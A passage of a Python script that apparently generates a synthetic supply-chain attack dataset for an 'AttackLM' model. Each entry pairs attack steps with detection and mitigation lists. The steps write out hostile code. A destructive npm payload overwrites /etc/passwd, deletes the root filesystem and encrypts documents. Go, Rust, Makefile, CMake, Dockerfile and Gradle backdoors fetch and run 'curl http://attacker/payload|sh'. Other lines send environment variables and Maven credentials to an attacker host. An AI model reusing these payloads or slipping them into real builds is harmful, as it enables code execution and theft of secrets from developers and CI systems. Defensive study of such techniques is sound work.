            "pip install --no-build-isolation for untrusted packages",
            "Sandbox package installation",
            "Package scanning in CI/CD",
            "pip-audit and safety checks",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Protestware / Intentional Package Sabotage",
        "mitre_ids": ["T1195.002"],
        "desc": "Maintainer intentionally adding destructive code to their own popular package.",
        "steps": "1. Identify high-visibility package by a single maintainer\n2. Add destructive code in new version:\n```javascript\nif (process.env.NODE_ENV === 'production') {\n  // Corrupt data\n  fs.writeFileSync('/etc/passwd', 'pwned');\n  // Delete files\n  rimraf.sync('/');\n  // Ransomware\n  for (const f of glob.sync('/home/**/*.docx')) { encrypt(f); }\n}\n```\n3. Publish as minor version bump (e.g., 1.0.0 → 1.0.1) for automatic updates\n4. Users auto-update via npm/yarn and execute destructive code\n5. Example cases: node-ipc, faker.js, colors.js, left-pad",
        "detection": [
            "Package version with destructive code patterns",
            "Filesystem access in packages that shouldn't need it",
            "Obfuscated code in package updates",
            "Package maintainer behavior anomalies",
        ],
        "mitigations": [
            "Pin dependencies to exact versions",
            "Lock files (package-lock.json, yarn.lock)",
            "Private registry with manual update review",
            "Automated testing before dependency updates",
            "Content trust verification",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious Python Package with Bytecode Obfuscation",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing Python packages that conceal malicious payloads in compiled .pyc bytecode files, evading source-level review.",
        "steps": "1. Create package with legitimate-looking .py source files\n2. Write malicious payload, compile to .pyc: `python -c 'import py_compile; py_compile.compile(\"payload.py\")'`\n3. Replace legitimate module import with .pyc: `import payload` loads payload.cpython-311.pyc\n4. .pyc executes malicious code via hidden import chain\n5. Source-level review sees clean .py files; payload lives in .pyc\n6. Publish: `twine upload dist/*` — review tools miss bytecode payload",
        "detection": [
            "Packages shipping .pyc files without corresponding .py source",
            "Discrepancy between .py and .pyc file contents",
            "Unexpected .pyc files in package wheel or sdist",
            "Bytecode decompilation revealing hidden code paths",
        ],
        "mitigations": [
            "Require source-only distribution (sdist without .pyc)",
            "Bytecode audit tools: uncompyle6, decompyle3 on installed packages",
            "CI/CD scanning that decompiles .pyc before approval",
            "pip install with --no-binary :all: for untrusted packages",
            "Package manifest review for unexpected compiled files",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious npm Package with Prototype Pollution",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing npm packages that exploit JavaScript prototype pollution to achieve code execution or data exfiltration.",
        "steps": "1. Create utility package with deep merge functionality\n2. Include prototype pollution vector: `function merge(target, source) { for (key in source) { target[key] = source[key]; } }`\n3. Package appears useful but allows `merge({}, JSON.parse('{\"__proto__\":{\"isAdmin\":true}}'))`\n4. Chain prototype pollution to RCE: pollute `child_process.spawn` arguments via __proto__\n5. Or pollute environment variables: `__proto__.NODE_OPTIONS: '--require /tmp/payload.js'`\n6. Publish: `npm publish --access public`",
        "detection": [
            "Packages with deep merge or extend without __proto__ protection",
            "npm packages modifying Object.prototype",
            "Unexpected property changes on global objects",
            "RCE chains originating from prototype pollution",
        ],
        "mitigations": [
            "Use Object.create(null) for safe dictionary objects",
            "Audit packages for unsafe merge/extend patterns",
            "npm audit with prototype pollution rules",
            "Freeze Object.prototype in production environments",
            "ES modules reduce prototype pollution attack surface",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious Go Module with init() Backdoor",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing Go modules with malicious init() functions that execute before application code runs.",
        "steps": '1. Create Go module with legitimate utility functions\n2. Add hidden init() function in internal package: `func init() { go func() { exec.Command("sh", "-c", "curl http://attacker/c2|sh").Run() }() }`\n3. init() runs automatically when package is imported, before main()\n4. Launch as goroutine to avoid blocking application startup\n5. Package passes normal review because init() is in subpackage\n6. Publish: `git tag v1.0.0 && git push origin v1.0.0`',
        "detection": [
            "Go packages with init() functions containing exec.Command calls",
            "Goroutines launched in init() with network operations",
            "Package imports that include net/http or os/exec in init path",
            "Unexpected outbound connections during Go application startup",
        ],
        "mitigations": [
            "Audit Go module init() functions during dependency review",
            "Use go vet with custom analyzers for suspicious init patterns",
            "CI/CD Go module scanning (nancy, govulncheck)",
            "Private Go proxy with manual module review",
            "Runtime network egress filtering for Go applications",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious Rust Crate with build.rs Backdoor",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing Rust crates with malicious build.rs scripts that execute code during compilation.",
        "steps": '1. Create Rust crate with legitimate functionality\n2. Add build.rs with malicious payload: `fn main() { std::process::Command::new("sh").arg("-c").arg("curl http://attacker/payload|sh").status().unwrap(); }`\n3. build.rs runs at compile time on developer machine and CI/CD\n4. Has access to build environment: env vars, filesystem, network\n5. Cargo.lock does not capture build.rs behavior — only tracks dependencies\n6. Publish: `cargo publish`',
        "detection": [
            "Crate build.rs with shell execution or network calls",
            "Unexpected outbound connections during cargo build",
            "build.rs downloading or executing external resources",
            "Crate compilation taking unusually long (C2 beacon delay)",
        ],
        "mitigations": [
            "Audit build.rs scripts before adding dependencies",
            "Use cargo-vet for peer-reviewed crate approval",
            "CI/CD build sandbox with network restrictions",
            "cargo-crev for crate trust and review tracking",
            "Build environment isolation (containers, firejail)",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious Docker Image with Hidden Layer",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing Docker images with malicious code hidden in layers that are obscured by subsequent layers.",
        "steps": "1. Create Dockerfile with malicious layer followed by cleanup layer:\n```\nFROM alpine:latest\nRUN curl http://attacker/backdoor > /usr/local/bin/backdoor && chmod +x /usr/local/bin/backdoor\nRUN rm /usr/local/bin/backdoor  # cleanup layer hides evidence\n```\n2. Backdoor is in image layer history but removed in final layer\n3. Image layer caching or manual layer extraction reveals backdoor\n4. Or: use multi-stage build to hide payload in builder stage\n5. Or: use scratch+COPY to hide malicious binary in final image\n6. Push: `docker push attacker/legitimate-looking-image`",
        "detection": [
            "Docker image layers with file additions followed by removals",
            "Image history showing suspicious RUN commands",
            "Layer diff analysis revealing hidden files",
            "Unexpected binary or script in image layer content",
        ],
        "mitigations": [
            "Use Docker image squashing to flatten layers",
            "Scan all layers with Trivy or Snyk (not just final image)",
            "Dive tool for layer-by-layer image inspection",
            "Build images from scratch with verified base images only",
            "Image signing with Docker Content Trust (Notary)",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious Helm Chart with CRD Injection",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing Helm charts with malicious Custom Resource Definitions that create backdoor resources in Kubernetes clusters.",
        "steps": "1. Create Helm chart with legitimate application templates\n2. Add malicious CRD in crds/ directory: define backdoor resource type\n3. Add webhook configuration in templates/ that intercepts Kubernetes API calls\n4. Or: add ClusterRoleBinding that grants cluster-admin to a service account\n5. CRDs are installed automatically before templates during helm install\n6. Backdoor CRD persists even after chart uninstall",
        "detection": [
            "Helm charts with unexpected CRD definitions",
            "ClusterRoleBindings granting excessive permissions",
            "Webhook configurations in chart templates",
            "CRDs that survive helm uninstall",
        ],
        "mitigations": [
            "Audit Helm chart CRDs before deployment",
            "Use Helm chart scanning tools (Checkov, Trivy)",
            "RBAC restrictions preventing CRD creation",
            "Admission controllers validating CRD definitions",
            "Private Helm repository with chart review process",
        ],
    },
    # === SBOM MANIPULATION ===
    {
        "category": "sbom_manipulation",
        "name": "SBOM Manipulation and Dependency Injection",
        "mitre_ids": ["T1195.002"],
        "desc": "Manipulating Software Bill of Materials to hide malicious dependencies or misrepresent components.",
        "steps": "1. Identify target's SBOM format (SPDX, CycloneDX, Syft)\n2. Generate legitimate SBOM: `syft <image> -o cyclonedx-json > sbom.json`\n3. Modify SBOM: remove malicious component from dependencies list\n4. Or: add legitimate-looking components that contain backdoors\n5. Replace package version: change `1.0.0-malicious` to `1.0.0` in SBOM\n6. Re-sign SBOM if signature verification is used\n7. Distribute manipulated SBOM with compromised software",
        "detection": [
            "SBOM hash mismatches",
            "Missing components in SBOM vs actual software",
            "Version inconsistencies between SBOM and installed packages",
            "SBOM signature verification failures",
        ],
        "mitigations": [
            "SBOM signing and verification",
            "Automated SBOM generation at build time",
            "SBOM comparison between environments",
            "SBOM authenticity validation",
            "Integration with vulnerability databases (OSV, NVD)",
        ],
    },
    {
        "category": "sbom_manipulation",
        "name": "Vulnerability Data Suppression in SBOM",
        "mitre_ids": ["T1195.002"],
        "desc": "Manipulating vulnerability scanning results by suppressing or misrepresenting SBOM data.",
        "steps": "1. Generate SBOM for target software\n2. Identify vulnerable components: `grype <sbom>` to find CVEs\n3. Modify SBOM to change component versions: replace `log4j:2.14.1` with `log4j:2.17.1`\n4. Or: remove vulnerable components from SBOM entirely\n5. Re-sign SBOM to pass validation\n6. Submit manipulated SBOM to compliance tools\n7. Vulnerability scanners report clean because SBOM doesn't include vulnerable version",
        "detection": [
            "SBOM component versions not matching installed versions",
            "Missing components that should be present",
            "SBOM modification timestamps",
            "SBOM component count discrepancies",
        ],
        "mitigations": [
            "SBOM generation at build time (not post-hoc)",
            "SBOM integrity verification (signatures, hashes)",
            "Runtime SBOM verification vs declared SBOM",
            "Multiple SBOM sources for cross-validation",
            "SBOM monitoring and alerting",
        ],
    },
    {
        "category": "sbom_manipulation",
        "name": "SBOM Injection with Fake Component",
        "mitre_ids": ["T1195.002"],
        "desc": "Injecting fabricated components into an SBOM to create false vulnerability alerts or mask real threats in noise.",
        "steps": "1. Obtain target's SBOM (CycloneDX or SPDX format)\n2. Fabricate component entries with known CVEs to trigger false alerts\n3. Or: inject many benign fake components to dilute scanner results and mask real vulnerabilities\n4. For CycloneDX: add to components array with fabricated purl and version\n5. For SPDX: add to packages array with fabricated SPDXID and packageVersion\n6. Re-sign if signature is required (requires key compromise)\n7. Noise injection forces analysts to waste time on false positives",
        "detection": [
            "SBOM components not matching any installed software",
            "Component purls or SPDXIDs that resolve to nonexistent packages",
            "SBOM component count significantly different from expected baseline",
            "Vulnerability scan results including unknown/unverifiable components",
        ],
        "mitigations": [
            "Cross-validate SBOM against runtime artifact inventory",
            "Require SBOM generation at build time from trusted tooling",
            "SBOM provenance verification (who generated, when, how)",
            "SBOM diff analysis against known-good baseline",
            "Integrate SBOM validation into deployment pipeline",
        ],
    },
    {
        "category": "sbom_manipulation",
        "name": "CycloneDX Signature Bypass",
        "mitre_ids": ["T1195.002"],
        "desc": "Bypassing CycloneDX SBOM signature verification to distribute tampered SBOMs that pass validation.",
        "steps": "1. Obtain signed CycloneDX SBOM (JSON or XML with dsig:Signature)\n2. Identify signature algorithm: typically XML-DSIG or JSON Web Signature\n3. Strip signature, modify SBOM content, re-sign with compromised key\n4. Or: exploit signature verification downgrade: modify SBOM to remove signature reference, some validators accept unsigned SBOM silently\n5. Or: replay valid signature from older SBOM version on modified content\n6. Or: exploit canonicalization attacks if XML C14N is improperly configured\n7. Tampered SBOM passes validation and is accepted by downstream consumers",
        "detection": [
            "SBOM signature timestamps not matching SBOM generation timestamps",
            "SBOM signed with unexpected or revoked key",
            "Signature verification silently accepting unsigned SBOMs",
            "Canonicalization attacks producing valid signature on modified content",
        ],
        "mitigations": [
            "Enforce mandatory SBOM signature verification (reject unsigned)",
            "Use JSON Web Signature (JWS) with ES256 or stronger",
            "Verify signing certificate chain and revocation status",
            "Include signature timestamp in verification logic",
            "SBOM signing key rotation and HSM protection",
        ],
    },
    {
        "category": "sbom_manipulation",
        "name": "SPDX License Field Manipulation",
        "mitre_ids": ["T1195.002"],
        "desc": "Manipulating SPDX license fields in SBOMs to conceal license compliance violations or enable legal supply chain attacks.",
        "steps": "1. Obtain target's SPDX-format SBOM\n2. Identify components with restrictive licenses (GPL, AGPL)\n3. Modify licenseConcluded and licenseDeclared fields: change 'GPL-3.0-only' to 'MIT'\n4. Or: change NOASSERTION to permissive license to pass compliance checks\n5. Submit manipulated SBOM to license compliance tool (FOSSA, Black Duck)\n6. Organization unknowingly ships GPL-licensed code under proprietary license\n7. Legal liability and potential downstream enforcement actions",
        "detection": [
            "License fields in SBOM not matching actual component licenses",
            "SPDX license expressions changed from copyleft to permissive",
            "NOASSERTION replaced with specific license without evidence",
            "SBOM license data not matching source repository license files",
        ],
        "mitigations": [
            "Automated license scanning at build time (not SBOM-only)",
            "Cross-validate SBOM licenses against source repository LICENSE files",
            "Use SPDX License List with strict matching guidelines",
            "License compliance tool with source-level verification",
            "SBOM license audit as part of release gate",
        ],
    },
    {
        "category": "sbom_manipulation",
        "name": "SBOM Drift Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Gradually drifting SBOM content away from actual software composition over multiple releases to evade detection.",
        "steps": "1. Obtain baseline SBOM for target software release\n2. In each release, make small modifications: add one fake component, remove one real component\n3. Each drift is too small to trigger diff alerts (below threshold)\n4. Over 10+ releases, SBOM diverges significantly from actual composition\n5. Insert backdoored component after sufficient drift has normalized discrepancies\n6. Detection thresholds designed for large diffs miss incremental changes\n7. Final SBOM bears little resemblance to actual software composition",
        "detection": [
            "Cumulative SBOM diff exceeding drift threshold over time",
            "SBOM drift rate analysis showing consistent small changes",
            "SBOM component churn rate exceeding expected baseline",
            "Historical SBOM comparison revealing divergent trends",
        ],
        "mitigations": [
            "SBOM drift detection with configurable threshold over time",
            "Require full SBOM regeneration at each release (no delta)",
            "SBOM validation against runtime artifact inventory at each deploy",
            "Cumulative drift alerting with rolling window analysis",
            "SBOM integrity verification with build-time attestation",
        ],
    },
    {
        "category": "sbom_manipulation",
        "name": "SBOM Confusion Between Environments",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting differences between SBOMs generated for different environments (dev, staging, prod) to deploy unverified components to production.",
        "steps": "1. Identify that organization generates separate SBOMs per environment\n2. Compromise staging/dev SBOM or inject extra components there\n3. Promote staging build to production using production SBOM\n4. Production SBOM doesn't include staging-only malicious component\n5. But staging artifact (with malicious component) is promoted to production\n6. Mismatch between production SBOM and actual deployed artifact goes undetected",
        "detection": [
            "SBOM differences between environments for same artifact",
            "Deployed components not matching production SBOM",
            "Artifact promotion without SBOM re-verification",
            "Environment-specific SBOMs not cross-validated",
        ],
        "mitigations": [
            "Generate single canonical SBOM per artifact (not per environment)",
            "Verify SBOM against deployed artifact at each environment boundary",
            "SBOM comparison gate before production deployment",
            "Require SBOM to travel with artifact through promotion pipeline",
            "Runtime SBOM verification in production (system roots analysis)",
        ],
    },
    # === BUILD TOOL COMPROMISE ===
    {
        "category": "build_tool_compromise",
        "name": "Compromised Compiler Injection",
        "mitre_ids": ["T1195.002"],
        "desc": "Compromising the compiler toolchain to inject malicious code into compiled binaries without modifying source code (Trusting Trust attack).",
        "steps": "1. Gain access to build infrastructure hosting the compiler\n2. Replace or modify compiler binary: inject code that adds backdoor when compiling specific targets\n3. Modified compiler detects target source patterns and injects malicious code during compilation\n4. Injected code is invisible in source review — only exists in compiled output\n5. Example: compiler injects backdoor function when it sees authentication module\n6. Recompile compiler with backdoor: now even compiler source appears clean\n7. Original Ken Thompson attack: compiler bootstraps itself with hidden backdoor",
        "detection": [
            "Binary diff between expected and actual compiled output",
            "Compiler binary hash mismatch against known-good version",
            "Reproducible build failures — different output from same source",
            "Unexpected symbols or functions in compiled binaries",
        ],
        "mitigations": [
            "Reproducible builds with verified compiler toolchain (SLSA Level 3+)",
            "Compiler binary integrity verification (hash, signature)",
            "Diverse double compilation (compile with two independent compilers)",
            "Build environment hardening and isolation",
            "NIST SP 800-115 compiler integrity verification methodology",
        ],
    },
    {
        "category": "build_tool_compromise",
        "name": "Build System Dependency Hijacking",
        "mitre_ids": ["T1195.002"],
        "desc": "Hijacking dependencies of the build system itself (not application dependencies) to compromise the build environment.",
        "steps": "1. Identify build system plugins and extensions: Gradle plugins, Maven extensions, Buck modules\n2. Check if build system dependencies are resolved from public registries\n3. Register malicious Gradle plugin with same ID as internal plugin\n4. Build system resolves malicious plugin from Maven Central/Gradle Plugin Portal\n5. Malicious plugin runs during build with full build environment access\n6. Exfiltrate secrets, modify artifacts, or inject backdoors",
        "detection": [
            "Build system plugins resolved from unexpected registries",
            "Build system plugin versions different from declared",
            "Build system dependencies with unusual network calls",
            "Plugin JAR hash mismatches against expected values",
        ],
        "mitigations": [
            "Pin build system plugin versions and verify hashes",
            "Use private plugin repository with allowlist",
            "Build system dependency resolution from internal registry only",
            "CI/CD audit of build system dependency tree",
            "Build system plugin signature verification",
        ],
    },
    {
        "category": "build_tool_compromise",
        "name": "Makefile Injection",
        "mitre_ids": ["T1195.002"],
        "desc": "Injecting malicious commands into Makefile targets to execute during the build process.",
        "steps": "1. Gain write access to project repository or Makefile includes\n2. Identify commonly used targets: `all`, `install`, `test`, `deploy`\n3. Inject malicious command into target: `install:; curl http://attacker/payload | sh && $(MAKE) real-install`\n4. Or: modify implicit rules: add `.c.o:; gcc -c $< && curl http://attacker/data?env=$(env | base64)`\n5. Or: poison include files: modify common.mk or rules.mk\n6. Build executes malicious commands as part of normal workflow",
        "detection": [
            "Makefile modifications adding unexpected shell commands",
            "Makefile includes from unexpected paths",
            "Build logs showing network calls during compilation",
            "Makefile diff showing new targets or modified recipes",
        ],
        "mitigations": [
            "Makefile review in CODEOWNERS with strict change approval",
            "Build environment network restrictions (no outbound during build)",
            "Makefile linting and validation in CI/CD",
            "Use deterministic Makefiles with explicit targets only",
            "Build environment isolation with egress filtering",
        ],
    },
    {
        "category": "build_tool_compromise",
        "name": "CMake Toolchain File Manipulation",
        "mitre_ids": ["T1195.002"],
        "desc": "Manipulating CMake toolchain files to inject malicious compiler flags or replace compiler paths.",
        "steps": '1. Identify CMake toolchain file: CMAKE_TOOLCHAIN_FILE or cmake/toolchain.cmake\n2. Gain write access to toolchain file or CMAKE_PREFIX_PATH location\n3. Modify CMAKE_C_COMPILER to point to malicious wrapper script\n4. Wrapper script: `#!/bin/sh; curl http://attacker/exfil?file=$1; /usr/bin/gcc "$@"`\n5. Or: inject malicious compiler flags: `set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -DPAYLOAD=\\"$(curl http://attacker/payload|sh)\\"")`\n6. All CMake builds using toolchain file compile with malicious flags or compiler',
        "detection": [
            "CMake toolchain file modifications outside normal workflow",
            "CMAKE_C_COMPILER or CMAKE_CXX_COMPILER pointing to unexpected path",
            "Unusual CMAKE_C_FLAGS or CMAKE_CXX_FLAGS values",
            "Compiler wrapper scripts in build environment",
        ],
        "mitigations": [
            "Pin and verify toolchain file contents in version control",
            "CMake toolchain integrity verification before build",
            "Build environment with immutable toolchain paths",
            "Compiler path validation in CI/CD pipeline",
            "CMake toolchain file review in CODEOWNERS",
        ],
    },
    {
        "category": "build_tool_compromise",
        "name": "Build Cache Poisoning",
        "mitre_ids": ["T1195.002"],
        "desc": "Poisoning build cache (ccache, sccache, Bazel remote cache) to serve compromised compilation results.",
        "steps": "1. Identify build cache system: ccache, sccache, Bazel remote execution cache\n2. Gain access to cache storage: compromised build host, shared NFS, S3 bucket\n3. Replace cached object file with malicious version: modify .o file to include backdoor code\n4. Or: poison ccache by compiling with backdoor and populating cache\n5. Subsequent builds using cache receive compromised object files\n6. Source code is clean but compiled output contains backdoor\n7. Bazel remote cache is especially vulnerable if authentication is weak",
        "detection": [
            "Build cache hit producing different binary than cache miss",
            "Cache storage access from unexpected processes",
            "Cached object file hashes not matching compilation output",
            "Build output differences between cached and uncached builds",
        ],
        "mitigations": [
            "Build cache integrity verification with content-addressable storage",
            "Cache access authentication and authorization",
            "Periodic cache invalidation and full rebuild verification",
            "Bazel remote cache with mTLS authentication",
            "Build reproducibility checks comparing cached vs uncached output",
        ],
    },
    # === PACKAGE MANAGER EXPLOIT ===
    {
        "category": "package_manager_exploit",
        "name": "npm Audit Suppression Exploit",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting npm audit suppression mechanisms to hide known vulnerabilities in dependency trees.",
        "steps": '1. Identify target\'s .npmrc or package.json audit configuration\n2. Create package with known vulnerability that target depends on transitively\n3. Add .npmauditrc to suppress vulnerability: `{"exceptions": {"<vuln-id>": "risk accepted"}}`\n4. Or: modify package.json to set `"overrides": {"vulnerable-pkg": "1.0.0"}` with backdoored version\n5. Or: exploit npm audit --omit=dev to hide dev dependency vulnerabilities promoted to prod\n6. Vulnerability scanners miss suppressed or overridden issues\n7. Backdoored dependency executes in production undetected',
        "detection": [
            ".npmauditrc files with broad vulnerability exceptions",
            "package.json overrides pointing to unexpected versions",
            "Dev dependencies promoted to production without audit",
            "npm audit suppression count exceeding threshold",
        ],
        "mitigations": [
            "Review and validate all npm audit suppression entries",
            "CI/CD enforcement: fail on any audit exception without justification",
            "Separate dev and production dependency audits",
            "npm audit monitoring with drift detection",
            "OWASP Supply Chain audit integration for npm projects",
        ],
    },
    {
        "category": "package_manager_exploit",
        "name": "pip install --no-deps Bypass",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting pip's --no-deps flag to install packages without dependency resolution, bypassing security checks on transitive dependencies.",
        "steps": "1. Identify target using `pip install --no-deps` in Dockerfiles or CI/CD scripts\n2. Create package that declares benign dependencies but ships malicious code inline\n3. With --no-deps, pip skips dependency resolution and security checks\n4. Package installs without triggering vulnerability checks on its declared dependencies\n5. Or: create package that shadows a security-critical dependency by installing it directly\n6. Security scanners that rely on pip's dependency tree miss the shadowed package\n7. Malicious code executes in production without dependency validation",
        "detection": [
            "CI/CD scripts using pip install --no-deps without justification",
            "Packages installed without corresponding dependency declarations",
            "pip freeze output showing packages not in requirements.txt",
            "Security scan gaps in dependency tree coverage",
        ],
        "mitigations": [
            "Avoid --no-deps in production build scripts",
            "Use pip-compile with hash checking for all dependencies",
            "CI/CD enforcement: flag any --no-deps usage in build scripts",
            "Runtime dependency verification against declared requirements",
            "MITRE ATT&CK Supply Chain assessment for pip workflow hardening",
        ],
    },
    {
        "category": "package_manager_exploit",
        "name": "Docker Layer Caching Exploit",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting Docker build layer caching to inject compromised layers into image builds.",
        "steps": "1. Identify Docker build cache: BuildKit cache, registry cache, or local layer cache\n2. Poison base image layer: push compromised base image to registry used in FROM\n3. Or: exploit Docker BuildKit cache import: `--cache-from=attacker/cache-image`\n4. Or: compromise shared CI/CD Docker cache registry\n5. Build uses poisoned cache layer instead of re-executing instruction\n6. Resulting image contains backdoor from cached layer\n7. Image passes security scan because only final layer is typically scanned",
        "detection": [
            "Docker base image hash mismatch against expected digest",
            "BuildKit cache imports from untrusted registries",
            "Docker image layers with unexpected content hash",
            "Layer cache hit rate anomalies in CI/CD builds",
        ],
        "mitigations": [
            "Pin base images with SHA256 digest (not tag)",
            "Use Docker Content Trust for image verification",
            "BuildKit cache from trusted registries only with mutual TLS",
            "Full image scanning including all layers (not just final)",
            "SLSA Framework build provenance for Docker images",
        ],
    },
    {
        "category": "package_manager_exploit",
        "name": "Gradle Plugin Backdoor",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing malicious Gradle plugins that execute code during the build lifecycle with full project access.",
        "steps": "1. Identify popular Gradle plugin categories: code quality, deployment, code generation\n2. Create plugin with useful functionality plus hidden malicious Task\n3. Register malicious Task to execute during build: `project.tasks.named('build').configure { doLast { exec { commandLine('sh', '-c', 'curl http://attacker/payload|sh') } } }`\n4. Or: add Gradle init script to plugin: runs before all projects\n5. Publish to Gradle Plugin Portal: `gradle publishPlugins`\n6. Plugin has full access to build environment, project source, and secrets",
        "detection": [
            "Gradle plugins with unexpected Task dependencies or actions",
            "Plugins executing shell commands or network calls during build",
            "Gradle init scripts from unverified sources",
            "Plugin JAR with classes not matching declared functionality",
        ],
        "mitigations": [
            "Audit Gradle plugin source before applying",
            "Use Gradle plugin verification with checksum validation",
            "Restrict plugin registry to approved plugins only",
            "Gradle build scan for monitoring plugin behavior",
            "Build sandbox with network restrictions for plugin execution",
        ],
    },
    {
        "category": "package_manager_exploit",
        "name": "Maven Wagon Credential Leak",
        "mitre_ids": ["T1552"],
        "desc": "Exploiting Maven Wagon provider configurations to leak repository credentials through custom wagon implementations.",
        "steps": "1. Identify Maven settings.xml with repository credentials: `<server><id>internal-repo</id><username>deploy</username><password>{encrypted}</password></server>`\n2. Create malicious Maven Wagon provider that intercepts credential transmission\n3. Register custom wagon: `<extension>org.apache.maven.wagon:wagon-http:3.5</extension>` modified version\n4. Wagon exfiltrates credentials: `http://attacker/collect?user=${username}&pass=${password}`\n5. Or: exploit Maven settings.xml decryption: master password in settings-security.xml\n6. Or: use Maven Extension to intercept all repository interactions\n7. Credentials used for internal artifact repos, CI/CD systems, and cloud deployments",
        "detection": [
            "Custom Maven Wagon providers in project extensions",
            "Maven settings.xml with credentials transmitted to unexpected hosts",
            "Maven Extension JARs with unexpected network calls",
            "Credential access patterns not matching expected repository usage",
        ],
        "mitigations": [
            "Use Maven encrypted settings with strong master password",
            "Verify Maven Wagon and Extension JAR provenance",
            "CI/CD Maven settings with token-based auth (not passwords)",
            "Network monitoring for Maven repository credential transmission",
            "Maven settings audit as part of NIST SP 800-115 assessment",
        ],
    },
]

QUESTION_TEMPLATES = [
    "Explain {name} with a detailed step-by-step attack walkthrough.",
    "How does {name} work? Show exploitation steps, detection, and remediation.",
    "For a supply chain security assessment, detail the {name} attack technique.",
    "Walk me through {name} exploitation. What are the key indicators and mitigations?",
    "Demonstrate {name} with specific commands and package examples.",
    "What is {name}? Provide exploitation steps, real command syntax, and defense strategies.",
    "Describe {name} from the attacker's perspective. How can organizations defend against it?",
    "In the context of an {environment}, explain {name} and its {severity} impact on supply chain security.",
    "Map {name} to {framework}. Detail the testing methodology and detection engineering approach.",
    "Perform a vulnerability assessment of {name} in an {environment}. What detection and mitigation strategies apply?",
    "How would you detect {name} using {framework}? Provide detection engineering methodology.",
    "Describe the {severity} risk of {name} in a {environment}. Include step-by-step security testing and mitigation.",
    "For {framework} compliance, document the {name} attack vector with full detection and mitigation coverage.",
    "What is the security testing methodology for {name} in an {environment}? Rate severity as {severity}.",
    "Explain {name} as a detection engineering challenge. Map to {framework} and describe {environment} mitigations.",
    "Detail the {name} vulnerability assessment workflow for an {environment} deployment under {framework}.",
    "How does {name} threaten supply chain integrity in an {environment}? Provide {severity} risk analysis with {framework} mapping.",
    "Create a {framework} test plan for {name} in an {environment}. Include detection, response, and validation steps.",
    "Analyze {name} through the lens of {framework}. What makes this a {severity} finding in an {environment}?",
    "Document {name} for a {framework} audit of an {environment}. Cover exploitation, detection engineering, and remediation.",
    "What detection engineering patterns identify {name} in an {environment}? Align with {framework} methodology.",
    "Provide a complete vulnerability assessment of {name} for {environment} compliance with {framework} at {severity} severity.",
    "How would a red team emulate {name} in an {environment}? Describe detection and {framework} alignment.",
    "Outline the {framework} testing approach for {name}. What {severity} indicators appear in an {environment}?",
]

ALL_CATEGORIES = sorted(set(a["category"] for a in ATTACKS))


def generate_pairs(count: int = 5) -> list[dict]:
    random.seed(SEED)
    pairs: list[dict] = []

    for attack in ATTACKS:
        category = attack["category"]
        name = attack["name"]
        mitre_ids = attack["mitre_ids"]

        base_variants = random.randint(3, 5)

        for _ in range(base_variants):
            env = random.choice(ENVIRONMENT_TYPES)
            severity = random.choice(SEVERITY_LEVELS)
            framework = random.choice(TESTING_FRAMEWORKS)

            q_template = random.choice(QUESTION_TEMPLATES)

            user = q_template.format(
                name=name,
                category=category.replace("_", " ").title(),
                environment=env,
                severity=severity,
                framework=framework,
            )

            assistant = f"**{name}** (MITRE: {', '.join(mitre_ids)})\n\n"
            assistant += f"**Category:** {category.replace('_', ' ').title()}\n\n"
            assistant += f"**Environment:** {env}\n\n"
            assistant += f"**Severity:** {severity.title()}\n\n"
            assistant += f"**Testing Framework:** {framework}\n\n"
            assistant += f"**Description:** {attack['desc']}\n\n"
            assistant += f"**Attack Steps:**\n{attack['steps']}\n\n"

            if attack.get("detection"):
                det = "\n".join(f"- {d}" for d in attack["detection"])
                assistant += f"**Detection:**\n{det}\n\n"

            if attack.get("mitigations"):
                mit = "\n".join(f"- {m}" for m in attack["mitigations"])
                assistant += f"**Mitigations:**\n{mit}\n"

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": SOURCE_NAME,
                    "license": LICENSE,
                    "metadata": {
                        "environment": env,
                        "severity": severity,
                        "framework": framework,
                    },
                }
            )

    random.shuffle(pairs)
    return pairs[:count] if count > 0 else pairs


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(
        description="Acquire Supply Chain Attack dataset for AttackLM"
    )
    parser.add_argument("--output", default=None, help="Custom output directory")
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of pairs to generate (0 for all, default: 5)",
    )
    args = parser.parse_args()

    output_dir = Path(args.output) if args.output else BUCKET_DIR
    data_file = output_dir / "data_synth.jsonl"
    meta_file = output_dir / "metadata.json"

    pairs = generate_pairs(count=args.count)

    output_dir.mkdir(parents=True, exist_ok=True)
    with open(data_file, "w", encoding="utf-8") as f:
        for pair in pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    from collections import Counter

    cat_counts = Counter()
    for p in pairs:
        for msg in p["messages"]:
            if msg["role"] == "assistant" and "**Category:**" in msg["content"]:
                for cat in ALL_CATEGORIES:
                    if cat.replace("_", " ").title() in msg["content"]:
                        cat_counts[cat] += 1
                        break

    mitre_ids_all: list[str] = []
    for p in pairs:
        mitre_ids_all.extend(p.get("mitre_ids", []))
    unique_mitre = sorted(set(mitre_ids_all))

    metadata = {
        "name": "attacks",
        "display_name": "Supply Chain Attacks",
        "category": "supply_chain",
        "mitre_tactic": "TA0042",
        "description": f"Supply chain attack dataset covering {len(cat_counts)} categories: {', '.join(c.replace('_', ' ').title() for c in ALL_CATEGORIES)}.",
        "source_file": data_file.name,
